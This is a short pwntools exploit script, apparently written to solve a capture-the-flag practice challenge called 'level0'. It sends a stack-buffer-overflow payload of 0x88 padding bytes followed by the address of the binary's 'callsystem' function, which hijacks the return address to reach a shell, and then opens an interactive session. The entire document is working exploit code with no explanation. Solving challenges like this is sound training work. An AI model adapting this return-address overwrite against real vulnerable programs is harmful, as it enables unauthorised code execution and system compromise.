from pwn import *

context.log_level = 'debug'

elf = ELF('./level0')
callsys_addr = elf.symbols['callsystem']

io = process('./level0')
io.recvuntil(b'World\n')

payload = b'A' * (0x80 + 0x8) + p64(callsys_addr)
io.send(payload)

io.interactive()
